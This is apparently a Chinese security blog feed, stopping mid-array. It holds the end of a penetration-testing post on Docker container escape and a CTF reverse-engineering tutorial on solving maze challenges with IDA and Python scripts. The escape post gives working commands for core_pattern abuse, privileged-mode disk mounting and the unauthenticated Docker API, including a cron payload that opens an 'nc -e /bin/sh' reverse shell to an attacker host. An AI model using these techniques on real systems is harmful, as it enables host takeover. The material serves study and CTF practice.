update</p><p>apt-get install docker.io</p><p>docker run -it -v &#x2F;:&#x2F;host ubuntu:18.04 &#x2F;bin&#x2F;bash # 将宿主机&#x2F;挂载到新容器的&#x2F;host。</p><h1 id="以上均在容器内执行。"><a href="#以上均在容器内执行。" class="headerlink" title="以上均在容器内执行。"></a>以上均在容器内执行。</h1><h2 id="挂载proc"><a href="#挂载proc" class="headerlink" title="挂载proc"></a>挂载proc</h2><p>从 2.6.19 内核版本开始，Linux 支持在 &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;core_pattern 中使用新语法。如果该文件中的首个字符是管道符 | ，那么该行的剩余内容将被当作用户空间程序或脚本解释并执行。</p><p>触发点在于&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;core_pattern负责配置进程崩溃时内存转储数据的导出方式。如果程序崩溃就会执行我们的命令</p><p>查找容器内core_pattern</p><p>find &#x2F; -name core_pattern</p><p>如果找到两个 core_pattern 文件，那可能就是挂载了宿主机的 procfs</p><p><strong>找到docker中文件对应宿主机的绝对路径：</strong></p><p>cat &#x2F;proc&#x2F;mounts | xargs -d ‘,’ -n 1 | grep workdir</p><p>找到的路径是宿主机中对应容器根目录的路径。</p><p><strong>执行命令脚本：</strong></p><p>#!&#x2F;bin&#x2F;bash</p><p>touch &#x2F;tmp&#x2F;ppp</p><p><strong>崩溃程序：</strong> 用gcc编译</p><p>#include&lt;stdio.h&gt; int main(void) {</p><p>int *a &#x3D; NULL;</p><p>*a &#x3D; 1;</p><p>return 0;</p><p>}</p><p><strong>写入core_pattern:</strong></p><p>echo</p><p>“|&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;82e9bf4baeaeef452bc9cf50a4c7ca11c8e108fe51e5f70546211fe 46a06678c&#x2F;merged&#x2F;tmp&#x2F;.lll.sh” &gt; &#x2F;host&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;core_pattern</p><p>然后在容器内执行崩溃程序即可逃逸。</p><h2 id="特权模式"><a href="#特权模式" class="headerlink" title="特权模式"></a>特权模式</h2><p><strong>查看是否以特权模式启动</strong></p><p>cat &#x2F;proc&#x2F;self&#x2F;status | grep CapEff</p><p>如果是以特权模式启动的话，CapEff 对应的掩码值应该为0000003fffffffff 或者是 0000001fffffffff</p><p><strong>利用</strong></p><h1 id="查找磁盘位置"><a href="#查找磁盘位置" class="headerlink" title="查找磁盘位置"></a>查找磁盘位置</h1><p>fdisk -l</p><h1 id="挂载磁盘到我们的目录"><a href="#挂载磁盘到我们的目录" class="headerlink" title="挂载磁盘到我们的目录"></a>挂载磁盘到我们的目录</h1><p>mkdir &#x2F;lll &amp;&amp; mount &#x2F;dev&#x2F;sda1 &#x2F;lll</p><h2 id="docker未授权访问"><a href="#docker未授权访问" class="headerlink" title="docker未授权访问"></a>docker未授权访问</h2><p><strong>docker启动http api：</strong></p><p>dockerd -H unix:&#x2F;&#x2F;&#x2F;var&#x2F;run&#x2F;docker.sock -H 0.0.0.0:2375</p><p>执行命令：</p><p>POST &#x2F;containers&#x2F;<container_id>&#x2F;exec HTTP&#x2F;1.1 Host: <docker_host>:PORT</p><p>Content-Type: application&#x2F;json Content-Length: 188</p><p>{</p><p>“AttachStdin”: true, “AttachStdout”: true, “AttachStderr”: true,</p><p>“Cmd”: [“命令”, “参数”],</p><p>比如（cat &#x2F;etc&#x2F;passwd）</p><p>“DetachKeys”: “ctrl-p,ctrl-q”, “Privileged”: true,</p><p>“Tty”: true</p><p>}</p><p>定时任务逃逸：</p><p>import docker</p><p>client &#x3D; docker.DockerClient(base_url&#x3D;’<a href="http://your-ip:2375/">http://your-ip:2375/</a>‘)</p><p>data &#x3D; client.containers.run(‘alpine:latest’, r’’’sh -c “echo ‘* * * * *</p><p>&#x2F;usr&#x2F;bin&#x2F;nc your-ip 21 -e &#x2F;bin&#x2F;sh’ &gt;&gt; &#x2F;tmp&#x2F;etc&#x2F;crontabs&#x2F;root” ‘’’, remove&#x3D;True, volumes&#x3D;{‘&#x2F;etc’: {‘bind’: ‘&#x2F;tmp&#x2F;etc’, ‘mode’: ‘rw’}})</p>]]></content>
    
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>迷宫逆向</title>
    <link href="/2025/03/22/%E8%BF%B7%E5%AE%AB%E9%80%86%E5%90%91/"/>
    <url>/2025/03/22/%E8%BF%B7%E5%AE%AB%E9%80%86%E5%90%91/</url>
    
    <content type="html"><![CDATA[<p>前言：该篇文章会介绍一个在ctf当中reverse方向中常见的一种迷宫题，我从攻防世界中选取了一道比较有代表性的题目，逐一讲解，并且每个思路都相当清晰透彻，借此分享，相信看完之后对于迷宫类型的题目会有更深的理解。</p><h1 id="例题1：攻防世界-reverse-re3"><a href="#例题1：攻防世界-reverse-re3" class="headerlink" title="例题1：攻防世界-reverse_re3"></a>例题1：攻防世界-reverse_re3</h1><h2 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h2><p>首先看有无壳，直接丢到exeinfope—发现是elf文件是linux的可执行程序</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1717234589796-a7e22b5b-307e-4b76-8a29-87319e857a1b.png"></p><h2 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h2><p>反手丢进ida看到main 直接F5反编译看一手</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1717234604020-6b0ec156-23fb-43fd-a782-8ade83694c45.png"></p><h2 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h2><p>一个一个函数来，sub_11B4双击点开好像没啥东西，看看sub_940</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs smali">__int64 sub_940()<br>&#123;<br> <span class="hljs-built_in"> int </span>v0; // eax<br> <span class="hljs-built_in"> int </span>v2; // [rsp+8h] [rbp-218h]<br> <span class="hljs-built_in"> int </span>v3; // [rsp+Ch] [rbp-214h]<br>  char v4[520]; // [rsp+10h] [rbp-210h] BYREF<br>  unsigned __int64 v5; // [rsp+218h] [rbp-8h]<br><br>  v5 = __readfsqword(0x28u);<br>  v3 = 0;<br>  memset(v4, 0, 0x200u<span class="hljs-class">LL);</span><br>  _isoc99_scanf(&amp;unk_1278, v4, v4);<br>  while ( 1 )<br>  &#123;<br>    do<br>    &#123;<br>      v2 = 0;<br>      sub_86C();<br>      v0 = v4[v3];<br>     <span class="hljs-built_in"> if </span>( v0 == &#x27;d&#x27; )               //原题是ascii码可以对着ascii按<span class="hljs-string">&quot;r&quot;</span>快捷键转成字符<br>      &#123;<br>        v2 = sub_E23();<br>      &#125;<br>      else<span class="hljs-built_in"> if </span>( v0 &gt; &#x27;d&#x27; )          //wasd很明显就是游戏里常见的移动键呗<br>      &#123;<br>       <span class="hljs-built_in"> if </span>( v0 == &#x27;s&#x27; )<br>        &#123;<br>          v2 = sub_C5A();<br>        &#125;<br>        else<span class="hljs-built_in"> if </span>( v0 == &#x27;w&#x27; )<br>        &#123;<br>          v2 = sub_A92();<br>        &#125;<br>      &#125;<br>      else<br>      &#123;<br>       <span class="hljs-built_in"> if </span>( v0 == 27 )<br>         <span class="hljs-built_in"> return </span>0xFFFFFFFF<span class="hljs-class">LL;</span><br>       <span class="hljs-built_in"> if </span>( v0 == &#x27;a&#x27; )<br>          v2 = sub_FEC();<br>      &#125;<br>      ++v3;<br>    &#125;<br>    while ( v2 != 1 );<br>   <span class="hljs-built_in"> if </span>( dword_202AB0 == 2 )<br>      break;<br>    ++dword_202AB0;<br>  &#125;<br>  puts(<span class="hljs-string">&quot;success! the flag is flag&#123;md5(your input)&#125;&quot;</span>);<br> <span class="hljs-built_in"> return </span>1<span class="hljs-class">LL;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>这里留个心眼，flag是要输入的md5值</p><p>接下来分析wasd到底是怎么走的（像这种题大概率就是迷宫图，所以要明白它是怎么运动的）</p><p>先打开sub_E23康康</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1717234684753-fa345f3c-fcd8-4cf2-a622-cf4e4773d23e.png"></p><h2 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h2><p>千万不要给这几个变量绕晕了</p><p>dword_202020：其实就是题目给的地图，可以双击进去看看（shift+e 提取数据）</p><p>dword_202AB0：代表哪个迷宫，此题有3个迷宫（至于为什么后文会提及）</p><p>dword_202AB4：代表行（因为15*，说明可能是一行15个数字，大胆猜测！）</p><p>dword_202AB8：代表列</p><p>225：地图尺寸15*15</p><p>这里我转换了一下不容易混淆</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1717234697051-8cfd01d3-dad0-4095-9bea-505930fca360.png"></p><h2 id="第五步"><a href="#第五步" class="headerlink" title="第五步"></a>第五步</h2><p>第一个if！&#x3D;14 是因为跟下标有关系，一行15个数字下标最大是14，我们这个函数是”d“的操作也就是向右移，所以是如果下标等于14的话就不能再”d“了<br>第二个if 判断当前位置右移的数字是不是1，如果是将该位置标志为3，之前的位置标志为1，其实就是暗示我们1是可以走的，而3其实是我们的起点，如果不理解后面看看迷宫就明白了，<br>第三个if如果右移后是4就返回1，说明4就是我们的终点</p><p>再看看上下移动的函数（下图是”s“的函数，也就是下移）——有一些题目上下移动不是单纯的往上或者往下 而是斜向下或者斜向上噢</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1717234791049-81359f85-da1d-49cc-82c9-71c6c429ac94.png"></p><h2 id="第六步"><a href="#第六步" class="headerlink" title="第六步"></a>第六步</h2><p>每次加15说明每次加一行</p><p>注意：这里分析的是右移”d“和下移”s“的函数至于”w“ ”a“都是差不多的，这里就不过多赘述了</p><p>再回到sub_940函数</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1717234822384-19edaf01-78e6-48f6-b162-16c4d2c4e14a.png"></p><h2 id="第七步"><a href="#第七步" class="headerlink" title="第七步"></a>第七步</h2><p>这里的dword_202AB0&#x3D;&#x3D;2 我们在前面提到它可能是标识哪一个迷宫的，这里说&#x3D;&#x3D;2的话就break，否则就++，说明这里会循环3次，说明会有3个迷宫，接下来我们来看看这个稍微的迷宫长什么样。</p><p>双击点开前文提到的dword_202020</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1717234833866-133d0ab3-eda8-48ac-8230-ec838e7ae849.png"></p><h2 id="第八步"><a href="#第八步" class="headerlink" title="第八步"></a>第八步</h2><p>这密密麻麻的数字就是它的数据啦，现在按shift+e提取数据，然后导出来</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1717234857731-0367cdf8-5cb7-470d-9b2b-5c37400107d3.png"><br>这里有个大大大坑，就是dword类型的数据是4位一组，只取第一位作为数值，也就是说100010000111 最终会变成110 ，后3位是填充的，接下来就是怎么转换成一个迷宫了，网上一堆wp却几乎没有人提到如何去把这份原始数据转换成迷宫，下面我提供了一个python脚本针对这道题目，只要运行即可得到迷宫的样子，</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1717234880358-f64c4fdd-828a-4744-afa3-70004e33c2d4.png"><br>一开始数据是这样的，先利用记事本的功能替换掉 ，和空格 以及前面的括号等等</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1717234923253-2411cdf6-26ea-44fa-9a59-8bdf81c838cf.png"><br>之后利用一下py脚本即可完成转换</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 输入需要处理的字符串  </span><br>input_string = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入需要处理的字符串：&quot;</span>)  <br><br><span class="hljs-comment"># 将所有字符连起来，去掉换行符  </span><br>output_string = input_string.replace(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)  <br>ZeK1D = output_string.replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;&quot;</span>)    <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_chars</span>(<span class="hljs-params">input_string</span>):  <br>    <span class="hljs-comment"># 将输入字符串分割为每四位  </span><br>    chunks = [input_string[i:i+<span class="hljs-number">4</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(input_string), <span class="hljs-number">4</span>)]  <br><br>    <span class="hljs-comment"># 提取每四位中的第一位字符  </span><br>    first_chars = [chunk[<span class="hljs-number">0</span>] <span class="hljs-keyword">for</span> chunk <span class="hljs-keyword">in</span> chunks <span class="hljs-keyword">if</span> chunk]  <br><br>    <span class="hljs-comment"># 将字符连在一起并输出  </span><br>    output= <span class="hljs-string">&#x27;&#x27;</span>.join(first_chars)  <br>    <span class="hljs-built_in">print</span>(output)  <br><br><br><span class="hljs-comment"># 调用函数并输出结果  </span><br>extract_chars(ZeK1D)<br></code></pre></td></tr></table></figure><p>之后可以将输出结果复制到word 改格式会好看一点</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1717234935670-ff0486b9-6c59-471a-88ef-dc0b0655cf92.png"></p><h2 id="第九步"><a href="#第九步" class="headerlink" title="第九步"></a>第九步</h2><p>之后再按每15行为一个迷宫分成3个小迷宫，以3为起点4为终点进行运动，之后再md5加密即可得到flag</p><p>第一个迷宫</p><p>[1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]</p><p>[1, 1, 1, 1, 1, 0, 3, 1, 1, 0, 0, 0, 0, 0, 0]</p><p>[1, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0]</p><p>[1, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0]</p><p>[1, 1, 1, 1, 1, 0, 0, 0, 1, 1, 1, 1, 1, 0, 0]</p><p>[1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0]</p><p>[1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0]</p><p>[1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0]</p><p>[1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0]</p><p>[1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 4, 0]</p><p>[1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]</p><p>[1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]</p><p>[1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]</p><p>[1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]</p><p>[1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]</p><p>第二个迷宫</p><p>[1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]</p><p>[1, 1, 0, 3, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0]</p><p>[1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0]</p><p>[1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0]</p><p>[1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 1, 1, 0, 0]</p><p>[1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0]</p><p>[1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0]</p><p>[1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0]</p><p>[1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0]</p><p>[1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0]</p><p>[1, 1, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0]</p><p>[1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0]</p><p>[1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 4, 0]</p><p>[1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]</p><p>[1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]</p><p>第三个迷宫</p><p>[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]</p><p>[0, 3, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]</p><p>[0, 0, 0, 1, 0, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0]</p><p>[0, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0]</p><p>[0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0]</p><p>[0, 1, 1, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0]</p><p>[0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0]</p><p>[0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0]</p><p>[0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 0]</p><p>[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0]</p><p>[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0]</p><p>[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0]</p><p>[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0]</p><p>[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0]</p><p>[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 4, 0]</p><p>行动轨迹为：ddsssddddsssdssdddddsssddddsssaassssdddsddssddwddssssssdddssssdddss</p><p>经过md5编码后flag是flag{aeea66fcac7fa80ed8f79f38ad5bb953}</p><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>逆向遇到迷宫题的思路大概分2点</p><p>1.弄清楚移动的方式</p><p>2.分析迷宫图的尺寸</p><p>3.手动走迷宫或写脚本走迷宫（建议BFS算法）</p><h1 id="例题2"><a href="#例题2" class="headerlink" title="例题2"></a>例题2</h1><p>查壳，放ida</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721287542512-fd0e9f66-ad89-4f99-aa08-b3c5fc41d933.png"></p><p>注意flag是md5（留个心眼），然后去动态调试找flag，这个createmap非常显眼</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721287626134-4c1d02ad-2ed0-48f3-a698-f92236473e44.png"></p><p>先下个断点，然后开始调试</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721287763212-b4cc0f54-cc4e-41f7-8325-4895a9b743ac.png"></p><p>任意输入一些，然后去search map</p><p>这里的快捷键有ctrl+T，查找下一个text</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721287799865-9ae1bc66-51e5-4083-a47e-0da39777b1ed.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721287879466-867a862b-99c2-4249-a32e-c3440b3ba5c8.png"></p><p>找到后shift+E提取数据，然后放入我们的脚本文件</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721287938904-da7cd899-3e25-4630-8538-420efe1ccc9f.png"><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721287963254-d35f1b10-f2d0-4c09-b86f-a9bed5885a19.png"></p><p>修改脚本中行列参数，运行脚本得到16*16的二维列表</p><p>将二维列表复制到【<strong>二.（一）</strong>】中的**&lt;脚本二：获得迷宫路径&gt;**中</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721288121231-bcb51aa9-1ef6-4e1c-801f-00a311c1fe8b.png"></p><p>分析check()函数得到起点坐标为(15, 1)，且本题未给出确切终点而是在main函数中给出了路径长为54</p><p>并且用aswd键位移动</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721288538242-b466a9b5-a88a-4108-a8be-e59dfb79cd2d.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721288574799-f3796f86-3941-4f3e-933b-fa988c94cb86.png"></p><p>这里附上最终代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> deque<br><span class="hljs-comment"># str为ida中使用快捷键[shift+e]提取到的数据, 如果提取的是string literal则加上引号视作字符串，如果是C array(decimal)则加上中括号视作列表</span><br><span class="hljs-built_in">str</span> = [<br><br>    <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,<br>    <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,<br>    <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,<br>    <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,<br>    <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,<br>    <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,<br>    <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,<br>    <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,<br>    <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,<br>    <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,<br>    <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,<br>    <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,<br>    <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,<br>    <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,<br>    <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,<br>    <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,<br>    <span class="hljs-number">1</span>,   <span 